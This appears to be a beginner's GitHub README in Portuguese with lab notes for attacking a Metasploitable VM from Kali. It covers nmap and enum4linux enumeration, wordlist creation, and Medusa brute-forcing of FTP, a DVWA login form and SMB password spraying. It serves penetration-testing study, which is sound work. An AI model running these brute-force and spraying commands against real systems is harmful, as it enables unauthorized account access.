# mysite
meu primeiro repositório
2 Maquinas 
Kali Linux IP 192.168.56.103

Metasploide 192.168.56.102

ping  -c 3 192.168.56.102( ip do meta no caso o alvo)

Foco FTP

Descobrir qual serviço está disponível pela porta Enumeração

nmap -sV -p 20,21,22,80,445,139 192.168.56.102

Conferir 
ftp 192.168.56.102

Ativo, porem pede nome de usuário e senha e não sabemos – DESCOBRIR

Ataque de força bruta

Criar lista de usuário e senha

Criando lista de usuário
echo -e “user\nmsfadmin\nadmin\nusuario\nbrasil\neu\ncadastro\nsoueu > users.txt

Criando lista de senhas
echo -e “123456\npassword\nmsfadmin\n123\n010101\n010203\nmamae\nsabara\npass111” > pass.txt

Rodando ataque com Medusa

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6

Vamos conferir
ftp 192.168.56.102

Ataque formulário Web
DVWA 

192.168.56.102/dvwa/login.php

Alvo: 192.168.56.102

Lista de usuários: users.txt
Lista de senhas: pass.txt

Ataque com Medusa

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:’/dvwa/login.php’ \
-m FORM:’ username=^USER^&password=^PASS^&Login=login’ \
-m ‘FAIL=Login failed’ -t 678

enum4linux -a 192.168.56.102 | tee enum4_output.txt
“echo -e “user\nmsfadmin\nadmin\nusuario\nbrasil\neu\ncadastro\nsoueu\nservice\nAdmin\nusuario\nhelp” > smb_users.txt
Echo -e “password\n123456\nWelcome123\nmsfadmin” > senhas_spray.txt

Agora vamos atacar
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50


